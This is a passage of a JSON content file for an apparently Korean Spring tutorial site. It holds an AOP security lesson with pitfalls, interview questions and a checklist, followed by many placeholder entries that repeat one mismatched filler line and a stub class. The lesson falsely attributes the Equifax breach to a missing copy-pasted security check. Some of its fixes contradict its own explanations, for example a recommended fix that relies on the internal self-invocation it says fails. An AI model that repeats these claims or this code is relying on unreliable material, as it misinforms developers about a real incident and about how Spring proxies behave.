beforeApiCall(JoinPoint joinPoint) {\n        // 보안 검증 - 자동 실행!!\n        String userId = extractUserId(joinPoint.getArgs());\n        if (!securityService.isAuthorized(userId)) {\n            throw new UnauthorizedException(\"접근 권한 없음\");\n        }\n\n        // 감사 로깅 - 자동 실행!!\n        String methodName = joinPoint.getSignature().getName();\n        auditLog(methodName, userId);\n\n        System.out.println(\"[AOP] ✅ 보안 검증 완료: \" + methodName);\n    }\n}\n\n// 2️⃣ Controller - 비즈니스 로직만 집중\n@RestController\npublic class UserController {\n\n    @GetMapping(\"/api/users\")\n    public UserInfo getUser(@RequestParam String userId) {\n        return userService.getUser(userId);\n        // securityCheck() 없어도 AOP가 자동 실행! ✅\n    }\n\n    @GetMapping(\"/api/dispute/user\")\n    public UserInfo getDisputeUser(@RequestParam String userId) {\n        return userService.getUser(userId);\n        // 새 API도 자동으로 보안 검증 적용! ✅\n    }\n\n    // 200개 메서드 전부 자동 보호 ✅✅✅\n}\n```\n\n**효과**:\n- ✅ **누락 불가능** - 모든 API에 자동 적용\n- ✅ **1곳만 수정** - 보안 정책 변경 시 Aspect만 수정\n- ✅ **코드 간결** - 비즈니스 로직만 남음\n- ✅ **테스트 용이** - 보안 로직 분리로 단위 테스트 쉬움"
      },
      {
        "type": "concept",
        "title": "⚠️ 실무 함정: AOP가 작동 안 하는 5가지 경우",
        "content": "## 💀 함정 1: Self-Invocation (내부 호출은 프록시 미적용)\n\n**문제**: 같은 클래스 내부에서 메서드를 호출하면 **AOP가 작동 안 함**\n\n### ❌ 잘못된 코드\n\n```java\n@Service\npublic class UserService {\n\n    @Transactional  // AOP 적용\n    public void createUser(User user) {\n        userRepository.save(user);\n        sendWelcomeEmail(user);  // 내부 호출 → AOP 미적용!\n    }\n\n    @Async  // AOP 적용되어야 하는데...\n    public void sendWelcomeEmail(User user) {\n        emailService.send(user.getEmail(), \"Welcome!\");\n        // 💀 @Async가 작동 안 함 → 동기로 실행됨\n    }\n}\n```\n\n**왜?** Spring AOP는 **프록시 기반**\n- 외부에서 호출 → Proxy 거쳐서 AOP 적용 ✅\n- 내부에서 호출 → Proxy 안 거침 → AOP 미적용 ❌\n\n```\n외부 호출: Controller → Proxy → UserService.createUser() ✅\n내부 호출: UserService.createUser() → this.sendWelcomeEmail() ❌ (Proxy 안 거침)\n```\n\n### ✅ 올바른 코드\n\n**해결 1: 별도 클래스로 분리**\n\n```java\n@Service\npublic class UserService {\n    @Autowired\n    private EmailService emailService;  // 외부 클래스 주입\n\n    @Transactional\n    public void createUser(User user) {\n        userRepository.save(user);\n        emailService.sendWelcomeEmail(user);  // 외부 호출 → AOP 적용 ✅\n    }\n}\n\n@Service\npublic class EmailService {\n    @Async  // 이제 작동함! ✅\n    public void sendWelcomeEmail(User user) {\n        emailService.send(user.getEmail(), \"Welcome!\");\n    }\n}\n```\n\n**해결 2: Self-Injection (자기 자신 주입)**\n\n```java\n@Service\npublic class UserService {\n    @Autowired\n    @Lazy  // 순환 참조 방지\n    private UserService self;  // 자기 자신을 Proxy로 주입\n\n    @Transactional\n    public void createUser(User user) {\n        userRepository.save(user);\n        self.sendWelcomeEmail(user);  // Proxy 거쳐서 호출 → AOP 적용 ✅\n    }\n\n    @Async\n    public void sendWelcomeEmail(User user) {\n        emailService.send(user.getEmail(), \"Welcome!\");\n    }\n}\n```\n\n---\n\n## 💀 함정 2: final/static 메서드는 프록시 불가\n\n**문제**: final/static 메서드는 **오버라이드 불가** → 프록시 생성 불가\n\n### ❌ 잘못된 코드\n\n```java\n@Service\npublic class PaymentService {\n\n    @Transactional  // 작동 안 함!\n    public final void processPayment(Payment payment) {\n        paymentRepository.save(payment);\n        // final이라 프록시가 오버라이드 못함 → 트랜잭션 미적용 💀\n    }\n\n    @Transactional  // 작동 안 함!\n    public static void refund(Payment payment) {\n        paymentRepository.delete(payment);\n        // static은 인스턴스 메서드가 아님 → 프록시 불가 💀\n    }\n}\n```\n\n### ✅ 올바른 코드\n\n```java\n@Service\npublic class PaymentService {\n\n    @Transactional  // 작동함! ✅\n    public void processPayment(Payment payment) {  // final 제거\n        paymentRepository.save(payment);\n    }\n\n    @Transactional  // 작동함! ✅\n    public void refund(Payment payment) {  // static 제거\n        paymentRepository.delete(payment);\n    }\n}\n```\n\n---\n\n## 💀 함정 3: private 메서드는 인터셉트 불가\n\n**문제**: private 메서드는 **외부에서 호출 불가** → AOP 적용 불가\n\n### ❌ 잘못된 코드\n\n```java\n@Service\npublic class OrderService {\n\n    @Transactional  // 작동 안 함!\n    private void cancelOrder(Order order) {  // private → AOP 미적용\n        order.setStatus(OrderStatus.CANCELLED);\n        orderRepository.save(order);\n        // 트랜잭션 없이 실행 → DB에 반영 안 될 수도 💀\n    }\n}\n```\n\n### ✅ 올바른 코드\n\n```java\n@Service\npublic class OrderService {\n\n    @Transactional  // 작동함! ✅\n    public void cancelOrder(Order order) {  // public으로 변경\n        order.setStatus(OrderStatus.CANCELLED);\n        orderRepository.save(order);\n    }\n}\n```\n\n**Tip**: protected도 일부 프록시 방식에서 작동 가능하지만 **public 권장**\n\n---\n\n## 💀 함정 4: Pointcut 표현식 실수\n\n**문제**: 표현식이 너무 넓거나 좁으면 **의도와 다르게 작동**\n\n### ❌ 잘못된 예시\n\n```java\n// ❌ 1. 너무 넓음 (모든 메서드에 적용)\n@Before(\"execution(* *(..))\")  // 모든 패키지, 모든 메서드 → 성능 저하\npublic void logEverything() { ... }\n\n// ❌ 2. 너무 좁음 (public만 지정)\n@Before(\"execution(public * com.example.service..*.*(..))\")\npublic void checkSecurity() { ... }\n// protected/package-private 메서드는 보안 검증 누락!\n\n// ❌ 3. 오타\n@Before(\"execution(* com.exmaple.service..*.*(..))\")  // exmaple (오타)\npublic void log() { ... }\n```\n\n### ✅ 올바른 예시\n\n```java\n// ✅ 1. 특정 패키지로 제한\n@Before(\"execution(* com.example.controller..*.*(..))\")\npublic void logControllers() { ... }\n\n// ✅ 2. 모든 접근 제어자 포함\n@Before(\"execution(* com.example.service..*.*(..))\")\npublic void checkSecurity() { ... }\n\n// ✅ 3. 커스텀 애너테이션 사용 (가장 안전)\n@Before(\"@annotation(SecureApi)\")\npublic void validateSecurity() { ... }\n```\n\n---\n\n## 💀 함정 5: @Transactional과 @Async 순서 문제\n\n**문제**: @Transactional과 @Async를 같이 쓰면 **순서에 따라 작동 안 함**\n\n### ❌ 잘못된 코드\n\n```java\n@Service\npublic class NotificationService {\n\n    @Async  // 먼저 적용\n    @Transactional  // 나중 적용 → 작동 안 함!\n    public void sendNotification(User user) {\n        notificationRepository.save(new Notification(user));\n        // 비동기로 실행되지만 트랜잭션 없음 → 저장 실패 가능 💀\n    }\n}\n```\n\n**왜?** AOP 순서: @Async가 먼저 적용 → 새 스레드 생성 → 트랜잭션 컨텍스트 끊김\n\n### ✅ 올바른 코드\n\n**해결 1: @Transactional을 먼저**\n\n```java\n@Service\npublic class NotificationService {\n\n    @Transactional  // 먼저 적용\n    @Async  // 나중 적용\n    public void sendNotification(User user) {\n        notificationRepository.save(new Notification(user));\n        // 트랜잭션 안에서 비동기 실행 ✅\n    }\n}\n```\n\n**해결 2: 분리 (권장)**\n\n```java\n@Service\npublic class NotificationService {\n    @Autowired\n    private NotificationRepository notificationRepository;\n\n    @Async  // 비동기 처리만\n    public void sendNotificationAsync(User user) {\n        saveNotification(user);  // 트랜잭션 메서드 호출\n    }\n\n    @Transactional  // 트랜잭션만\n    public void saveNotification(User user) {\n        notificationRepository.save(new Notification(user));\n    }\n}\n```\n\n---\n\n## 📋 빠른 체크리스트\n\n| 함정 | 증상 | 해결 |\n|------|------|------|\n| **Self-Invocation** | 같은 클래스 내부 호출 시 AOP 미적용 | 별도 클래스 분리 or Self-Injection |\n| **final/static** | 프록시 생성 불가 | final/static 제거 |\n| **private** | 외부 호출 불가 | public으로 변경 |\n| **Pointcut 실수** | 의도와 다르게 적용 | 표현식 검증, 커스텀 애너테이션 사용 |\n| **@Transactional + @Async** | 트랜잭션 미적용 | @Transactional 먼저 or 분리 |\n\n---\n\n## 🎯 핵심 원칙\n\n```\n✅ AOP 작동 조건:\n   1. 외부에서 호출 (Self-Invocation 금지)\n   2. public 메서드 (private/final/static 금지)\n   3. 정확한 Pointcut 표현식\n   4. 프록시 생성 가능한 클래스\n\n❌ AOP 미작동 = 보안 검증 누락 = Equifax 재현\n```\n\n**\"Copy-Paste를 반복하는 순간, 당신은 Equifax가 된다. AOP로 자동화하라.\"**"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "완전한 AOP 보안 시스템",
        "code": "// 필요한 import 문들\nimport org.aspectj.lang.annotation.*;\nimport org.aspectj.lang.JoinPoint;\nimport org.springframework.stereotype.Component;\nimport org.springframework.stereotype.Service;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.*;\nimport lombok.extern.slf4j.Slf4j;\nimport java.lang.annotation.*;\nimport java.time.LocalDateTime;\nimport java.util.Arrays;\n\n// 1️⃣ 커스텀 애너테이션 정의\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface SecureApi {\n    String[] roles() default {};  // 허용 역할\n}\n\n// 2️⃣ 보안 Aspect\n@Aspect\n@Component\n@Slf4j\npublic class SecurityAspect {\n    \n    @Autowired\n    private SecurityService securityService;\n    \n    @Autowired\n    private AuditLogService auditLogService;\n    \n    @Before(\"@annotation(secureApi)\")\n    public void checkSecurity(JoinPoint joinPoint, SecureApi secureApi) {\n        // 1. 사용자 인증 확인\n        String userId = SecurityContextHolder.getContext().getAuthentication().getName();\n        if (userId == null || userId.equals(\"anonymousUser\")) {\n            throw new UnauthorizedException(\"로그인 필요\");\n        }\n        \n        // 2. 역할 기반 권한 확인\n        String[] requiredRoles = secureApi.roles();\n        if (requiredRoles.length > 0) {\n            boolean hasRole = Arrays.stream(requiredRoles)\n                .anyMatch(role -> securityService.hasRole(userId, role));\n            \n            if (!hasRole) {\n                log.warn(\"[보안] 권한 없음 - User: {}, Required: {}\", \n                    userId, Arrays.toString(requiredRoles));\n                throw new ForbiddenException(\"권한 없음\");\n            }\n        }\n        \n        // 3. IP 화이트리스트 확인\n        String clientIp = getClientIp();\n        if (!securityService.isAllowedIp(clientIp)) {\n            log.error(\"[보안] 차단된 IP - User: {}, IP: {}\", userId, clientIp);\n            throw new ForbiddenException(\"차단된 IP\");\n        }\n        \n        log.info(\"[보안] ✅ 검증 통과 - User: {}, Method: {}\", \n            userId, joinPoint.getSignature().getName());\n    }\n    \n    @AfterReturning(pointcut = \"@annotation(secureApi)\", returning = \"result\")\n    public void auditLog(JoinPoint joinPoint, SecureApi secureApi, Object result) {\n        String userId = SecurityContextHolder.getContext().getAuthentication().getName();\n        String methodName = joinPoint.getSignature().getName();\n        String params = Arrays.toString(joinPoint.getArgs());\n        \n        // 감사 로그 저장\n        auditLogService.log(AuditLog.builder()\n            .userId(userId)\n            .action(methodName)\n            .parameters(params)\n            .timestamp(LocalDateTime.now())\n            .ipAddress(getClientIp())\n            .build());\n        \n        log.info(\"[감사] 📝 API 호출 기록 - User: {}, Action: {}\", userId, methodName);\n    }\n    \n    @AfterThrowing(pointcut = \"@annotation(secureApi)\", throwing = \"ex\")\n    public void handleSecurityException(JoinPoint joinPoint, Exception ex) {\n        String userId = SecurityContextHolder.getContext().getAuthentication().getName();\n        String methodName = joinPoint.getSignature().getName();\n        \n        log.error(\"[보안] ❌ 보안 위반 - User: {}, Method: {}, Error: {}\", \n            userId, methodName, ex.getMessage());\n        \n        // 보안 위반 알림 전송\n        securityService.sendSecurityAlert(userId, methodName, ex.getMessage());\n    }\n    \n    private String getClientIp() {\n        // HttpServletRequest에서 IP 추출\n        return \"127.0.0.1\";  // 실제로는 request.getRemoteAddr() 사용\n    }\n}\n\n// 3️⃣ Controller에서 사용\n@RestController\n@RequestMapping(\"/api\")\npublic class UserController {\n    \n    @Autowired\n    private UserService userService;\n    \n    // 일반 사용자도 접근 가능\n    @SecureApi\n    @GetMapping(\"/users/{id}\")\n    public UserInfo getUser(@PathVariable String id) {\n        return userService.getUser(id);\n        // AOP가 자동으로:\n        // - 로그인 확인 ✅\n        // - IP 확인 ✅\n        // - 감사 로그 ✅\n    }\n    \n    // ADMIN만 접근 가능\n    @SecureApi(roles = {\"ADMIN\"})\n    @DeleteMapping(\"/users/{id}\")\n    public void deleteUser(@PathVariable String id) {\n        userService.deleteUser(id);\n        // AOP가 자동으로:\n        // - 로그인 확인 ✅\n        // - ADMIN 역할 확인 ✅\n        // - IP 확인 ✅\n        // - 감사 로그 ✅\n    }\n    \n    // ADMIN 또는 MANAGER만 접근\n    @SecureApi(roles = {\"ADMIN\", \"MANAGER\"})\n    @GetMapping(\"/reports/sensitive\")\n    public Report getSensitiveReport() {\n        return reportService.getSensitiveReport();\n    }\n}\n\n// 4️⃣ 실행 결과\n/*\n[보안] ✅ 검증 통과 - User: john@example.com, Method: getUser\n[감사] 📝 API 호출 기록 - User: john@example.com, Action: getUser\n\n[보안] 권한 없음 - User: guest@example.com, Required: [ADMIN]\nException: ForbiddenException: 권한 없음\n[보안] ❌ 보안 위반 - User: guest@example.com, Method: deleteUser\n*/"
      },
      {
        "type": "quiz",
        "title": "💼 면접 필수 질문",
        "questions": [
          {
            "question": "Equifax 사건에서 AOP를 사용했다면 어떻게 방지할 수 있었나요?",
            "answer": "**@Before Advice로 모든 API에 자동 보안 검증**\n\nEquifax는 신규 API에서 보안 코드 복사를 누락했습니다.\n\n```java\n// ❌ 문제: 수동 복사 방식\n@GetMapping(\"/api/dispute/user\")\npublic UserInfo getDisputeUser(String userId) {\n    // securityCheck() 복사 깜빡!! → 해킹 당함\n    return userService.getUser(userId);\n}\n\n// ✅ 해결: AOP 자동 적용\n@Aspect\npublic class SecurityAspect {\n    @Before(\"execution(* com.example.controller..*.*(..))\")\n    public void checkSecurity(JoinPoint jp) {\n        securityService.validate();  // 모든 메서드에 자동 적용!\n    }\n}\n```\n\n**효과**: 신규 API를 추가해도 자동으로 보안 검증. **누락 불가능**."
          },
          {
            "question": "Spring AOP의 Pointcut 표현식을 3가지 설명하세요.",
            "answer": "**1. execution** - 메서드 실행 시점\n```java\n// com.example.service 패키지의 모든 public 메서드\nexecution(public * com.example.service.*.*(..))\n\n// UserService의 get으로 시작하는 메서드\nexecution(* com.example.service.UserService.get*(..))\n```\n\n**2. @annotation** - 특정 애너테이션이 붙은 메서드\n```java\n// @Transactional이 붙은 모든 메서드\n@annotation(org.springframework.transaction.annotation.Transactional)\n\n// @SecureApi가 붙은 메서드만\n@annotation(com.example.annotation.SecureApi)\n```\n\n**3. within** - 특정 타입 내의 모든 메서드\n```java\n// UserController의 모든 메서드\nwithin(com.example.controller.UserController)\n\n// controller 패키지의 모든 클래스\nwithin(com.example.controller..*)\n```\n\n**실무 Tip**: `execution`은 넓게 적용, `@annotation`은 선택적 적용에 사용."
          },
          {
            "question": "@Around Advice는 언제 사용하고, @Before/@After와 차이는?",
            "answer": "**@Around**: 메서드 실행 **전후를 모두 제어**\n\n```java\n@Around(\"@annotation(Timed)\")\npublic Object measureTime(ProceedingJoinPoint pjp) throws Throwable {\n    long start = System.currentTimeMillis();\n    \n    Object result = pjp.proceed();  // 원본 메서드 실행\n    \n    long elapsed = System.currentTimeMillis() - start;\n    log.info(\"{} 실행 시간: {}ms\", pjp.getSignature(), elapsed);\n    \n    return result;  // 결과 반환\n}\n```\n\n**@Before**: 메서드 실행 **전**만\n```java\n@Before(\"@annotation(SecureApi)\")\npublic void checkSecurity(JoinPoint jp) {\n    securityService.validate();  // 실행 전 검증\n    // 원본 메서드는 Spring이 자동 실행\n}\n```\n\n**차이점**:\n- **@Around**: `proceed()` 호출 필수, 반환값 조작 가능, 예외 처리 가능\n- **@Before/@After**: 원본 메서드 자동 실행, 반환값 조작 불가\n\n**사용 시점**:\n- **@Around**: 성능 측정, 트랜잭션, 캐싱 (실행 전후 필요)\n- **@Before**: 보안 검증, 파라미터 로깅 (실행 전만)\n- **@After**: 리소스 정리, 감사 로그 (실행 후만)"
          },
          {
            "question": "AOP를 사용하면 안 되는 경우는?",
            "answer": "**❌ AOP 피해야 하는 경우**:\n\n**1. 비즈니스 로직 자체**\n```java\n// ❌ 나쁜 예: 핵심 로직을 AOP로\n@Around(\"execution(* calculatePrice(..))\")\npublic Object applyDiscount(PJP pjp) {\n    Object result = pjp.proceed();\n    return (double)result * 0.9;  // 할인 적용\n}\n// 문제: 비즈니스 규칙이 숨겨짐, 디버깅 어려움\n\n// ✅ 좋은 예: 명시적으로\npublic double calculatePrice() {\n    double basePrice = getBasePrice();\n    return discountService.apply(basePrice);  // 명확함\n}\n```\n\n**2. 특정 메서드에만 필요한 기능**\n```java\n// ❌ 1개 메서드에 AOP 쓰지 마세요\n@Around(\"execution(* sendWelcomeEmail(..))\")\npublic Object addRecipient(PJP pjp) { ... }\n\n// ✅ 그냥 메서드 안에 작성\npublic void sendWelcomeEmail(User user) {\n    emailService.send(user.getEmail(), \"Welcome\");\n}\n```\n\n**3. 성능이 중요한 반복 호출**\n- AOP는 프록시 오버헤드 있음 (약 0.01ms)\n- 초당 100만 번 호출되는 메서드는 직접 구현\n\n**원칙**: **모든 메서드에 공통 적용**할 때만 AOP. 1~2개 메서드면 직접 작성."
          }
        ]
      },
      {
        "type": "concept",
        "title": "🎯 생존 체크리스트",
        "content": "## ✅ 당신의 프로젝트는 안전한가?\n\n### 🔍 AOP 적용 체크\n\n```bash\n# 1. 보안 검증 코드가 중복되는가?\ngrep -r \"securityCheck\\|validateToken\" src/\n# 3곳 이상 등장 → AOP로 통합하라\n\n# 2. 로깅 코드가 모든 메서드에 있는가?\ngrep -r \"logger.info\\|logger.debug\" src/\n# 100줄 이상 → @Around로 자동화하라\n\n# 3. 트랜잭션 관리가 수동인가?\ngrep -r \"beginTransaction\\|commit\\|rollback\" src/\n# 발견되면 → @Transactional 사용하라\n```\n\n### 📊 위험도 평가\n\n| 상황 | 위험도 | 조치 |\n|------|--------|------|\n| 보안 코드를 복사-붙여넣기 | 🔴 **치명적** | 즉시 AOP 적용 |\n| 로깅이 일부 메서드에만 있음 | 🟠 **높음** | AOP로 통합 |\n| 성능 측정이 수동 | 🟡 **중간** | @Around 고려 |\n| 예외 처리가 중복됨 | 🟡 **중간** | @AfterThrowing 사용 |\n\n### 🛡️ 즉시 적용 패턴\n\n**1. 보안 검증 AOP (필수!)**\n```java\n@Aspect\npublic class SecurityAspect {\n    @Before(\"@annotation(SecureApi)\")\n    public void validate(JoinPoint jp) {\n        securityService.check();\n    }\n}\n```\n\n**2. 감사 로그 AOP**\n```java\n@Aspect\npublic class AuditAspect {\n    @AfterReturning(\"@annotation(Auditable)\")\n    public void log(JoinPoint jp) {\n        auditService.record(jp.getSignature(), jp.getArgs());\n    }\n}\n```\n\n**3. 성능 측정 AOP**\n```java\n@Aspect\npublic class PerformanceAspect {\n    @Around(\"@annotation(Timed)\")\n    public Object measure(PJP pjp) throws Throwable {\n        long start = System.currentTimeMillis();\n        Object result = pjp.proceed();\n        log.info(\"{}ms\", System.currentTimeMillis() - start);\n        return result;\n    }\n}\n```\n\n### ⚠️ 경고 신호\n\n```java\n// 🚨 이런 코드가 보이면 즉시 AOP로 전환\n\npublic void method1() {\n    logger.info(\"시작\");        // 중복 1\n    securityCheck();           // 중복 2\n    // ...\n}\n\npublic void method2() {\n    logger.info(\"시작\");        // 또 복사\n    securityCheck();           // 또 복사\n    // ...\n}\n\n// 3번째 복사하려는 순간 → AOP 적용!!\n```\n\n---\n\n## 💀 마지막 경고\n\n```\n┌──────────────────────────────────────────────────────┐\n│  \"같은 코드를 3번째 복사하는 순간,                    │\n│   당신은 차기 Equifax가 될 준비를 하는 것이다.\"      │\n│                                                      │\n│  - Copy-Paste는 기술 부채가 아니라 시한폭탄          │\n│  - 누락된 1개 메서드 = 1억 4,300만 명 유출           │\n│  - AOP는 선택이 아니라 생존 필수                     │\n└──────────────────────────────────────────────────────┘\n```\n\n**지금 당장 적용하세요. 내일은 늦습니다.**"
      }
    ]
  },
  "13_AOP/aop-logging": {
    "id": "13_AOP/aop-logging",
    "title": "Aop Logging",
    "category": "spring",
    "subCategory": "13_AOP",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Aop Logging",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "14_운영/graceful-shutdown": {
    "id": "14_운영/graceful-shutdown",
    "title": "Graceful Shutdown",
    "category": "spring",
    "subCategory": "14_운영",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Graceful Shutdown",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "14_운영/health-check": {
    "id": "14_운영/health-check",
    "title": "Health Check",
    "category": "spring",
    "subCategory": "14_운영",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Health Check",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "14_운영/logging": {
    "id": "14_운영/logging",
    "title": "Logging",
    "category": "spring",
    "subCategory": "14_운영",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Logging",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "14_테스트/mockmvc": {
    "id": "14_테스트/mockmvc",
    "title": "Mockmvc",
    "category": "spring",
    "subCategory": "14_테스트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Mockmvc",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "14_테스트/spring-test": {
    "id": "14_테스트/spring-test",
    "title": "Spring Test",
    "category": "spring",
    "subCategory": "14_테스트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Test",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "14_테스트/testcontainers": {
    "id": "14_테스트/testcontainers",
    "title": "Testcontainers",
    "category": "spring",
    "subCategory": "14_테스트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Testcontainers",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "15_고급/custom-annotation": {
    "id": "15_고급/custom-annotation",
    "title": "Custom Annotation",
    "category": "spring",
    "subCategory": "15_고급",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Custom Annotation",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "15_고급/event": {
    "id": "15_고급/event",
    "title": "Event",
    "category": "spring",
    "subCategory": "15_고급",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Event",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "15_고급/filter": {
    "id": "15_고급/filter",
    "title": "Filter",
    "category": "spring",
    "subCategory": "15_고급",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Filter",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "15_문서화/restdocs": {
    "id": "15_문서화/restdocs",
    "title": "Restdocs",
    "category": "spring",
    "subCategory": "15_문서화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Restdocs",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "15_문서화/swagger": {
    "id": "15_문서화/swagger",
    "title": "Swagger",
    "category": "spring",
    "subCategory": "15_문서화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Swagger",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "16_로깅/logback": {
    "id": "16_로깅/logback",
    "title": "Logback",
    "category": "spring",
    "subCategory": "16_로깅",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Logback",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "16_로깅/logging-basic": {
    "id": "16_로깅/logging-basic",
    "title": "Logging Basic",
    "category": "spring",
    "subCategory": "16_로깅",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Logging Basic",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "16_배치/batch-job": {
    "id": "16_배치/batch-job",
    "title": "Batch Job",
    "category": "spring",
    "subCategory": "16_배치",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Batch Job",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "17_설정/config-props": {
    "id": "17_설정/config-props",
    "title": "Config Props",
    "category": "spring",
    "subCategory": "17_설정",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Config Props",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "17_설정/profile": {
    "id": "17_설정/profile",
    "title": "Profile",
    "category": "spring",
    "subCategory": "17_설정",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Profile",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "17_프로젝트/project-auth": {
    "id": "17_프로젝트/project-auth",
    "title": "Project Auth",
    "category": "spring",
    "subCategory": "17_프로젝트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Project Auth",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "18_면접/interview-jpa": {
    "id": "18_면접/interview-jpa",
    "title": "Interview Jpa",
    "category": "spring",
    "subCategory": "18_면접",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Jpa",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "18_면접/interview-spring-advanced": {
    "id": "18_면접/interview-spring-advanced",
    "title": "Interview Spring Advanced",
    "category": "spring",
    "subCategory": "18_면접",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Spring Advanced",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "18_면접/interview-spring-basic": {
    "id": "18_면접/interview-spring-basic",
    "title": "Interview Spring Basic",
    "category": "spring",
    "subCategory": "18_면접",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Spring Basic",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "18_면접/interview-spring-mvc": {
    "id": "18_면접/interview-spring-mvc",
    "title": "Interview Spring Mvc",
    "category": "spring",
    "subCategory": "18_면접",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Spring Mvc",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
